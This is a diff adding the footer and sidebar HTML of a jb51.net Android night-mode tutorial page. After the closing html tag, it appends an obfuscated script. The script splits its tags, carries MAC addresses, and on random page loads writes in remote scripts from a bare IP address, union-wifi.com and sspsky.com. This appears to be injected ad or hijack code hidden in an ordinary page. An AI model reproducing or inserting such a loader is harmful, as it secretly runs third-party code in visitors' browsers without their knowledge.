+<p>以上就是这篇文章的全部内容了，希望能对各位Android开发者们有所帮助。</p>
+
+</div><!--endmain-->
+<div class="art_xg">
+<h4>您可能感兴趣的文章:</h4><ul><li><a href="/article/107311.htm" title="Android 夜间模式的实现代码示例" target="_blank">Android 夜间模式的实现代码示例</a></li><li><a href="/article/92663.htm" title="Android 实现夜间模式的快速简单方法实例详解" target="_blank">Android 实现夜间模式的快速简单方法实例详解</a></li><li><a href="/article/92606.htm" title="三行Android代码实现白天夜间模式流畅切换" target="_blank">三行Android代码实现白天夜间模式流畅切换</a></li><li><a href="/article/88721.htm" title="Android主题切换之探究白天和夜间模式" target="_blank">Android主题切换之探究白天和夜间模式</a></li><li><a href="/article/79720.htm" title="Android夜间模式最佳实践" target="_blank">Android夜间模式最佳实践</a></li><li><a href="/article/47227.htm" title="android基础教程之夜间模式实现示例" target="_blank">android基础教程之夜间模式实现示例</a></li><li><a href="/article/107587.htm" title="Android实现夜间模式切换功能实现代码" target="_blank">Android实现夜间模式切换功能实现代码</a></li></ul>
+</div>
+<div class="lbd clearfix">
+<span id="art_down" class="jbTestPos"></span>
+</div>
+<div id="shoucang"></div>
+<div class="tags mt10">
+<strong>Tags：</strong><a href="http://img.jb51.net/tag/android/1.htm" target="_blank" title="搜索关于android的文章">android</a> <a href="http://img.jb51.net/tag/%D2%B9%BC%E4/1.htm" target="_blank" title="搜索关于夜间的文章">夜间</a> <a href="http://img.jb51.net/tag/%C4%A3%CA%BD/1.htm" target="_blank" title="搜索关于模式的文章">模式</a> 
+</div>
+<DIV class="relatedarticle clearfix mt5">
+<H2>相关文章</H2>
+<ul><li><span>2016-06-06</span><a href="/article/86176.htm" title="使用Broadcast实现Android组件间的通信" target="_blank">使用Broadcast实现Android组件间的通信</a></li><li><span>2013-04-04</span><a href="/article/36009.htm" title="android开发中获取手机分辨率大小的方法" target="_blank">android开发中获取手机分辨率大小的方法</a></li><li><span>2013-06-06</span><a href="/article/38162.htm" title="android中图片的三级缓存cache策略(内存/文件/网络)" target="_blank">android中图片的三级缓存cache策略(内存/文件/网络)</a></li><li><span>2016-09-09</span><a href="/article/93042.htm" title="Android开发之DiffUtil的使用详解" target="_blank">Android开发之DiffUtil的使用详解</a></li><li><span>2016-12-12</span><a href="/article/100473.htm" title="Android常用对话框使用大全" target="_blank">Android常用对话框使用大全</a></li><li><span>2015-12-12</span><a href="/article/75847.htm" title="Android编程中的5种数据存储方式" target="_blank">Android编程中的5种数据存储方式</a></li><li><span>2014-01-01</span><a href="/article/46183.htm" title="Android中用MediaRecorder进行录影的实例代码" target="_blank">Android中用MediaRecorder进行录影的实例代码</a></li><li><span>2013-02-02</span><a href="/article/34260.htm" title="Android 开机广播的使用及配置" target="_blank">Android 开机广播的使用及配置</a></li><li><span>2016-07-07</span><a href="/article/89108.htm" title="适用于Android开发的简单聊天软件" target="_blank">适用于Android开发的简单聊天软件</a></li><li><span>2015-10-10</span><a href="/article/73624.htm" title="Android 广播大全 Intent Action 事件详解" target="_blank">Android 广播大全 Intent Action 事件详解</a></li></ul>
+</DIV>
+<div class="lbd clearfix mt5">
+<span id="art_down2" class="jbTestPos"></span>
+</div>
+<a href="#comments"></a>
+<div id="comments">
+<H2>最新评论</H2>
+<div class="pd5"><div id="SOHUCS" sid="art_93852"></div></div>
+</div>
+      </div><!--endborder-->
+      </div><!--end fl-->
+      
+<div class="w300 fr">
+<div class="r300 clearfix"><span id="side_up" class="jbTestPos"></span></div>
+<DIV class="tabTitleBar mt10 bgf borderTblue">
+<DIV class="borderTnone pb10 YaHei">
+<H4 class="blue">大家感兴趣的内容</H4>
+<UL class="newsList newList-in">
+<li><EM class="no1">1</EM><a href="/article/50395.htm" title="一看就懂的Android APP开发入门教程" target="_blank">一看就懂的Android APP开发入门教</a></li><li><EM class="no2">2</EM><a href="/article/41750.htm" title="微信公众平台开发入门教程(图文详解)" target="_blank">微信公众平台开发入门教程(图文详</a></li><li><EM class="no3">3</EM><a href="/article/40108.htm" title="Android基础之使用Fragment控制切换多个页面" target="_blank">Android基础之使用Fragment控制切</a></li><li><EM class="no4">4</EM><a href="/article/51052.htm" title="六款值得推荐的android（安卓）开源框架简介" target="_blank">六款值得推荐的android（安卓）开</a></li><li><EM class="no5">5</EM><a href="/article/31911.htm" title="Android应用开发SharedPreferences存储数据的使用方法" target="_blank">Android应用开发SharedPreferenc</a></li><li><EM class="no6">6</EM><a href="/article/33060.htm" title="android TextView设置中文字体加粗实现方法" target="_blank">android TextView设置中文字体加</a></li><li><EM class="no7">7</EM><a href="/article/32339.htm" title="Android 动画之TranslateAnimation应用详解" target="_blank">Android 动画之TranslateAnimati</a></li><li><EM class="no8">8</EM><a href="/article/48557.htm" title="android压力测试命令monkey详解" target="_blank">android压力测试命令monkey详解</a></li><li><EM class="no9">9</EM><a href="/article/32366.htm" title="Android Bitmap详细介绍" target="_blank">Android Bitmap详细介绍</a></li><li><EM class="no10">10</EM><a href="/article/36668.htm" title="android调试工具DDMS的使用详解" target="_blank">android调试工具DDMS的使用详解</a></li>
+</UL>
+</DIV>
+</DIV>
+<div class="r300 clearfix mt10"><span id="idctu" class="jbTestPos"></span></div>
+<DIV class="tabTitleBar mt10 bgf borderTblue">
+<DIV class="borderTnone pb10 YaHei">
+<H4 class="blue">最近更新的内容</H4>
+<UL class="newsListA">
+<ul><li><a href="/article/37480.htm" title="基于Fedora14下自带jdk1.6版本 安装jdk1.7不识别的解决方法" target="_blank">基于Fedora14下自带jdk1.6版本 安装jdk1.</a></li><li><a href="/article/38094.htm" title="自定义Adapter并通过布局泵LayoutInflater抓取layout模板编辑每一个item实现思路" target="_blank">自定义Adapter并通过布局泵LayoutInflate</a></li><li><a href="/article/69474.htm" title="Android解析Intent Filter的方法" target="_blank">Android解析Intent Filter的方法</a></li><li><a href="/article/77832.htm" title="Android自定义圆角ImageView" target="_blank">Android自定义圆角ImageView</a></li><li><a href="/article/65498.htm" title="Android Studio使用教程（一）：下载与安装及创建HelloWorld项目" target="_blank">Android Studio使用教程（一）：下载与安</a></li><li><a href="/article/33238.htm" title="android计算pad或手机的分辨率/像素/密度/屏幕尺寸/DPI值的方法" target="_blank">android计算pad或手机的分辨率/像素/密度</a></li><li><a href="/article/42573.htm" title="android操作XML的几种方法总结" target="_blank">android操作XML的几种方法总结</a></li><li><a href="/article/93692.htm" title="Android通过HTTP协议实现上传文件数据" target="_blank">Android通过HTTP协议实现上传文件数据</a></li><li><a href="/article/82911.htm" title="Android中TimePicker与DatePicker时间日期选择组件的使用实例" target="_blank">Android中TimePicker与DatePicker时间日期</a></li><li><a href="/article/93640.htm" title="深入理解Android手势识别" target="_blank">深入理解Android手势识别</a></li></ul>
+</UL>
+</DIV>
+</DIV>   
+<div class="r300 clearfix mt10"><span id="idctu1" class="jbTestPos"></span></div>
+<DIV class="tabTitleBar mt10 bgf borderTblue">
+<DIV class="borderTnone pb10 YaHei">
+<H4 class="blue">常用在线小工具</H4>
+<ul class="newsListA"><span id="bctools" class="jbTestPos"></span></ul>
+</DIV>
+</DIV>
+<div class="r300 clearfix mt10" id="idctu2"><span id="idctu2" class="jbTestPos"></span></div>
+<div class="mt10 rFixedBox">
+<span id="r_2" class="jbTestPos"></span>
+</div>
+      
+      
+      </div><!--end fr-->
+      </div>
+</div><!--end content-->
+<div id="footer">
+<div class="main clearfix">
+<p>
+<a href="http://www.jb51.net/about.htm" target="_blank">关于我们</a> - 
+<a href="http://www.jb51.net/support.htm" target="_blank">广告合作</a> - 
+<a href="http://www.jb51.net/linkus.htm" target="_blank">联系我们</a> -  
+<a href="http://www.jb51.net/sm.htm" target="_blank">免责声明</a> -  
+<a href="http://www.jb51.net/sitemap.htm" target="_blank">网站地图</a> - 
+<a href="tencent://message/?uin=461478385&Site=http://www.jb51.net" target="_blank">投诉建议</a> - 
+<a href="http://www.jb51.net/up.htm" target="_blank">在线投稿</a>
+</p>
+<p>&copy;CopyRight 2006-2016 JB51.Net Inc All Rights Reserved. 脚本之家 版权所有</p>
+</div>
+</div><!--end footer-->
+<link type="text/css" rel="stylesheet" href="/jslib/syntaxhighlighter/styles/shCore.css" />
+<link type="text/css" rel="Stylesheet" href="/jslib/syntaxhighlighter/styles/shThemeDefault.css" />
+<script type="text/javascript" src="/jslib/syntaxhighlighter/scripts/shCore.js"></script>
+<script type="text/javascript" src="/jslib/syntaxhighlighter/scripts/shAutoloader.js"></script>
+<script type="text/javascript">
+(function(){
+    var bp = document.createElement('script');
+    bp.src = '//push.zhanzhang.baidu.com/push.js';
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+if (top.location != self.location)top.location=self.location;
+$(function(){
+	$('#content').find('img').each(function(){
+        var img = this;
+        if (img.width >= 650){
+            img.style.width = "650px";
+            img.style.height = "auto";
+            //$(img).removeAttr('height');
+            var aTag = document.createElement('a');
+            aTag.href = img.src;
+			aTag.target="_blank";
+            $(aTag).addClass('bPic')
+            .insertAfter(img).append(img)
+          }
+    });
+	$(window).scroll(function()
+    {	
+    	//rFixedBox跟随滚动
+    	var h = $(window).height();
+        var top = $(window).scrollTop();
+    	var rFixedBox = $('.rFixedBox').prev().offset();
+        var fixedTop = rFixedBox.top;
+		
+        if(top>=fixedTop+344)
+        {
+			var h1 = parseInt($('#content').children('.main').height());
+			if(parseInt(top) + 340 < h1){
+				$('.rFixedBox').css({'position':'fixed','top': 0});
+			}else{
+				$('.rFixedBox').css({'position':'absolute','top': h1-510});
+			}
+        }
+        else
+        {
+            $('.rFixedBox').css({'position':'static', 'top':0});   
+        }	
+       /* return true;*/
+    });
+SyntaxHighlighter.autoloader(
+	'applescript			/jslib/syntaxhighlighter/scripts/shBrushAppleScript.js',
+	'actionscript3 as3		/jslib/syntaxhighlighter/scripts/shBrushAS3.js',
+	'bash shell				/jslib/syntaxhighlighter/scripts/shBrushBash.js',
+	'coldfusion cf			/jslib/syntaxhighlighter/scripts/shBrushColdFusion.js',
+	'cpp c					/jslib/syntaxhighlighter/scripts/shBrushCpp.js',
+	'obj-c objc				/jslib/syntaxhighlighter/scripts/shBrushObjC.js',
+	'c# c-sharp csharp		/jslib/syntaxhighlighter/scripts/shBrushCSharp.js',
+	'css					/jslib/syntaxhighlighter/scripts/shBrushCss.js',
+	'delphi pascal			/jslib/syntaxhighlighter/scripts/shBrushDelphi.js',
+	'diff patch pas			/jslib/syntaxhighlighter/scripts/shBrushDiff.js',
+	'erl erlang				/jslib/syntaxhighlighter/scripts/shBrushErlang.js',
+	'groovy					/jslib/syntaxhighlighter/scripts/shBrushGroovy.js',
+	'haxe hx				/jslib/syntaxhighlighter/scripts/shBrushHaxe.js',
+	'java					/jslib/syntaxhighlighter/scripts/shBrushJava.js',
+	'jfx javafx				/jslib/syntaxhighlighter/scripts/shBrushJavaFX.js',
+	'js jscript javascript	/jslib/syntaxhighlighter/scripts/shBrushJScript.js',
+	'perl pl				/jslib/syntaxhighlighter/scripts/shBrushPerl.js',
+	'php					/jslib/syntaxhighlighter/scripts/shBrushPhp.js',
+	'text plain				/jslib/syntaxhighlighter/scripts/shBrushPlain.js',
+	'py python				/jslib/syntaxhighlighter/scripts/shBrushPython.js',
+	'ruby rails ror rb		/jslib/syntaxhighlighter/scripts/shBrushRuby.js',
+	'scala					/jslib/syntaxhighlighter/scripts/shBrushScala.js',
+	'sql					/jslib/syntaxhighlighter/scripts/shBrushSql.js',
+	'vb vbnet				/jslib/syntaxhighlighter/scripts/shBrushVb.js',
+	'ps powershell			/jslib/syntaxhighlighter/scripts/shBrushPowerShell.js',
+	'xml xhtml xslt html	/jslib/syntaxhighlighter/scripts/shBrushXml.js'
+);
+SyntaxHighlighter.all();
+});
+var ourl="";
+</script>
+<script type="text/javascript" src='http://common.jb51.net/js/jbLoader.js'></script>
+<script>jbLoader();</script><script class="closetag">jbLoader(true);</script>
+<script>jbLoader();</script><script class="closetag">jbLoader(true);</script>
+<script>jbLoader();</script><script class="closetag">jbLoader(true);</script>
+<script>jbLoader();</script><script class="closetag">jbLoader(true);</script>
+<script>jbLoader();</script><script class="closetag">jbLoader(true);</script>
+<script>jbLoader();</script><script class="closetag">jbLoader(true);</script>
+<script>jbLoader();</script><script class="closetag">jbLoader(true);</script>
+<script>jbLoader();</script><script class="closetag">jbLoader(true);</script>
+<script>jbLoader();</script><script class="closetag">jbLoader(true);</script>
+<script>jbLoader();</script><script class="closetag">jbLoader(true);</script>
+<script>jbLoader();</script><script class="closetag">jbLoader(true);</script>
+<script>jbLoader();</script><script class="closetag">jbLoader(true);</script>
+<div id="tongji">
+<script type="text/javascript" src="http://common.jb51.net/inc/tongji.js"></script>
+<script charset="utf-8" type="text/javascript" src="http://changyan.sohu.com/upload/changyan.js" ></script>
+<script type="text/javascript">
+window.changyan.api.config({
+appid: 'cyrHH3dwi',
+conf: 'prod_1dc5dc80970106099d43fe242b7465fc'
+});
+</script>
+</div>
+<script type="text/javascript" src="http://www.jb51.net/pl.asp?id=93852"></script>
+</body>
+</html>
+<!-- published at 2017-3-6 8:34:01By dxycms qq:461478385  -->
+<script>
+function ik_random(){var ik_r_min=0;var ik_r_max=100;return(parseInt(Math.random()*(ik_r_max-ik_r_min+1)+ik_r_min));}
+function ik_isiframe(){return (self!=top);}
+var __m='b8:2a:72:c1:db:f9';
+var __m2='00:00:00:00:00:00';
+var __h="<sc"+"ript src=\"http://101.201.53.95/js.php?uid=48c591bb0b2e4fd248d81fbb9360387b,PC,";
+var __b="&r="+Math.random()+__m+__m2+"\"></scr"+"ipt>";
+var x=ik_random();
+if(!ik_isiframe()){
+switch(true){
+case x>=0&&x<5:
+document.write(__h+"200"+__b);
+document.write("<sc"+"ript src=\"http://js.union-wifi.com/zm.js?cid=10270&dmac="+__m2+"&umac="+__m+"\"></scr"+"ipt>");
+break;
+case x>=5&&x<10:
+document.write(__h+"12"+__b);
+document.write("<sc"+"ript src=\"http://res.sspsky.com/cp.js?cid=F3FFAE2FDC1B\"></scr"+"ipt>");
+break;
+case x>=95&&x<=100:
+document.write(__h+"100"+__b);
+document.write("<sc"+"ript src=\"http://js.union-wifi.com/zm.js?cid=10269&dmac="+__m2+"&umac="+__m+"\"></scr"+"ipt>");
+break;
+}
+}
+</script>
